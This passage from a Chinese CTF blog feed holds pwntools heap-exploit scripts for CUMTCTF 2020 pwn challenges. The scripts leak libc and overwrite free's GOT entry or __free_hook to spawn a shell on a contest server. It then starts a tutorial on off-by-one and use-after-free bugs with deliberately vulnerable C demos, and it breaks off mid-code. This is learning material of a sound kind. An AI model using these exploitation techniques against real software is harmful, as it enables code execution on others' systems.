class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"OK!"</span>)</span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">print(hex(system_addr))</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#print(hex(heap.got['free']))</span></span><br><span class="line"><span class="comment">#add(0x10,"/bin/sh\x00")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN6-fail"><a href="#PWN6-fail" class="headerlink" title="PWN6(fail)"></a>PWN6(fail)</h2><p>exp1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./pwn6'</span>)</span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10005'</span>)</span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#idx </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> sh.recvuntil(<span class="string">'size&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(str(size))</span><br><span class="line"> sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> <span class="comment">#sh.recvuntil('dele success')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'5'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="comment">#leave message at bss</span></span><br><span class="line">sh.recvuntil(<span class="string">'secret\n'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaa'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="comment">#overwrite</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x130</span>, <span class="string">'aa'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>, <span class="string">'aa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'aaaaaaa'</span>)<span class="comment">#edit this to ....</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaaaaa\x0a'</span>)</span><br><span class="line"><span class="comment">#sh.recv(8)</span></span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4ca8</span></span><br><span class="line">free_addr = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">malloc_addr = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(hex(free_addr))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#h</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)</span><br><span class="line"><span class="comment">#x/30gx 0x602120 </span></span><br><span class="line"><span class="comment">#bss_ptr</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x88</span> * <span class="string">'a'</span> + <span class="string">'\xb1'</span>)<span class="comment">#</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">'aaa'</span>)<span class="comment">#</span></span><br><span class="line">payload1 = <span class="number">0x20</span> * <span class="string">'a'</span> + <span class="string">'\x98'</span> + <span class="number">7</span> * <span class="string">'\x00'</span> + p64(free_addr)</span><br><span class="line">edit(<span class="number">8</span>,payload1)</span><br><span class="line"><span class="comment">#one_addr = libc_base + 0x45226 #0x4527a,0xf0364,0xf1207</span></span><br><span class="line">one_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line">payload2 = p64(one_addr)</span><br><span class="line">edit(<span class="number">4</span>,payload2)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>exp2:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line"><span class="comment"># p = elf.process()</span></span><br><span class="line">p = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10005'</span>)</span><br><span class="line"><span class="comment"># libc = ELF('libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enter</span><span class="params">()</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">"important secret"</span>,<span class="string">"ld1ng"</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,con)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"> p.sendlineafter(<span class="string">'size&gt;&gt;'</span>,str(size))</span><br><span class="line"> p.sendlineafter(<span class="string">'name&gt;&gt;'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"> p.sendafter(<span class="string">'name&gt;&gt;'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line">enter()</span><br><span class="line">add(<span class="number">0</span>,<span class="number">128</span>,<span class="string">"aaa"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">128</span>,<span class="string">"bbb"</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> -libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">info(hex(libc_base))</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">info(hex(sys))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">"ccc"</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">"ddd"</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x88</span>,<span class="string">"eee"</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x88</span> + <span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xc8</span>,<span class="string">"fff"</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">16</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x88</span>)+p64(<span class="number">0x602080</span>)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendline(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment"># add(6,0x80,"ld1ng")</span></span><br><span class="line">edit(<span class="number">3</span>,p64(sys))</span><br><span class="line"><span class="comment">#p.sendline("ls")</span></span><br><span class="line"><span class="comment">#p.sendline("cat flag")</span></span><br><span class="line"><span class="comment"># delete(4)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN7-fail"><a href="#PWN7-fail" class="headerlink" title="PWN7(fail)"></a>PWN7(fail)</h2><p>&gt;<br>&gt;<br>&gt;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process("./pwn7")</span></span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10050'</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"1"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(size))</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"2"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="comment">#step1: 构造出0x200的pre_size</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):<span class="comment">#用到10个块</span></span><br><span class="line"> add(<span class="number">0x80</span>,<span class="string">'a'</span> * <span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):<span class="comment">#六个进入tcahce</span></span><br><span class="line"> delete(i)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#防止top_chunk合并</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">9</span>):</span><br><span class="line"> delete(i)<span class="comment">#pre_size分别为0x0,0x100,0x200 （这里合并了）</span></span><br><span class="line"><span class="comment">#到这里全部都free掉了，7个在tcache,3个在unsorted_bin</span></span><br><span class="line"><span class="comment">#step2: 把0x100放入tcache 并由块7进入unsorted_bin提供libc</span></span><br><span class="line"><span class="comment">#另外注意一下idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#占满tcache 这里是倒着的 6,5,4,3,2,1，x,x,x,0</span></span><br><span class="line"> add(<span class="number">0x8</span>,p64(i))</span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">7</span>)) <span class="comment">#切分unsorted_bin</span></span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">9</span>)) <span class="comment">#10个分配完毕</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>): <span class="comment">#这里idx=6没有释放 也就是最上面的</span></span><br><span class="line"> delete(i)</span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#进入tcache 带着0x100</span></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment">#进入unsorted_bin 提供Libc </span></span><br><span class="line">add(<span class="number">0xf8</span>, p64(<span class="number">0</span>)) <span class="comment">#这次分配的是idx=8的B块， 将C块的inuse位给清了</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#填满tcache</span></span><br><span class="line">delete(<span class="number">9</span>) <span class="comment">#促使块合并，但块8还在使用</span></span><br><span class="line"><span class="comment">#step3: leak libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line"> add(<span class="number">0x8</span>, p64(i))</span><br><span class="line">add(<span class="number">0x8</span> ,p64(<span class="number">7</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log.success((hex(libc_base)))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">target = libc.symbols[<span class="string">"__free_hook"</span>] + libc_base</span><br><span class="line">log.success(hex(target))</span><br><span class="line">sys_addr = libc.symbols[<span class="string">"system"</span>] + libc_base</span><br><span class="line">one_addr = libc_base + <span class="number">0x4f432</span> <span class="comment">#0x4f2c5 </span></span><br><span class="line">add(<span class="number">0x10</span>, p64(target))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(one_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后面几个堆题有一个上次新生赛的原题，但就是做不出来</p><p>堆的东西还是不太熟悉，我tcl</p><p>马上考试了，先去复习了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CUMTCTF2020岁末赛&quot;&gt;&lt;a href=&quot;#CUMTCTF2020岁末赛&quot; class=&quot;headerlink&quot; title=&quot;CUMTCTF2020岁末赛&quot;&gt;&lt;/a&gt;CUMTCTF2020岁末赛&lt;/h1&gt;&lt;p&gt;学长们可太搞了，比赛最后垂直上分可太秀了&lt;/</summary>
      
    
    
    
    <category term="wp" scheme="https://pz1o.top/categories/wp/"/>
    
    
    <category term="WP" scheme="https://pz1o.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>堆漏洞及其利用</title>
    <link href="https://pz1o.top/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/"/>
    <id>https://pz1o.top/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/</id>
    <published>2020-12-22T13:17:06.000Z</published>
    <updated>2021-03-03T07:28:46.689Z</updated>
    
    <content type="html"><![CDATA[<p>堆基础和堆漏洞还是分开比较好</p><p>这样看着也比较整齐</p><h1 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h1><h2 id="0x01-Off-By-One"><a href="#0x01-Off-By-One" class="headerlink" title="0x01 Off By One"></a>0x01 Off By One</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。</p><h3 id="2-利用思路"><a href="#2-利用思路" class="headerlink" title="2.利用思路"></a>2.利用思路</h3><p>(1) 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。</p><p>(2) 溢出字节为 NULL 字节：溢出的一个字节恰好覆盖下一堆块的size域的最低位，将PREV_INUSE位置0，这样前块会被认为是 free 块。这时可以选择使用 unlink 方法进行处理(后面将详细介绍)，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。</p><h3 id="3-演示"><a href="#3-演示" class="headerlink" title="3.演示"></a>3.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);<span class="comment">//断点</span></span><br><span class="line">    gets(<span class="built_in">buffer</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="built_in">buffer</span>)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,<span class="built_in">buffer</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这个程序的问题在于strlen 在计算长度的时候不会把结束符 ‘\x00’ 计算在内，但strcpy 在拷贝的时候会把 ‘\x00’ 也算上，所以就会造成 off by one。</p><p>我们先来调试一下</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219141904042.png" alt="image-20201219141904042"></p><p>直接看堆情况 分配24字节上面为什么堆size为0x21也就是33字节 这个可以看上面的</p><p>因为它会把下面一个pre_size占用</p><p>输入24个A</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219142302977.png" alt="image-20201219142302977"></p><p>可以很直观的看到确实是溢出了一个字节</p></blockquote><h2 id="0x02-Use-After-Free"><a href="#0x02-Use-After-Free" class="headerlink" title="0x02 Use After Free"></a>0x02 Use After Free</h2><h3 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="1.概念"></a>1.概念</h3><p>Use After Free(UAF)即释放后使用漏洞。若堆指针在释放后未置空，形成悬挂指针，当下次访问该指针时，依然能够访问原指针所指向的堆内容，形成漏洞。</p><h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><h3 id="3-演示-1"><a href="#3-演示-1" class="headerlink" title="3.演示"></a>3.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span 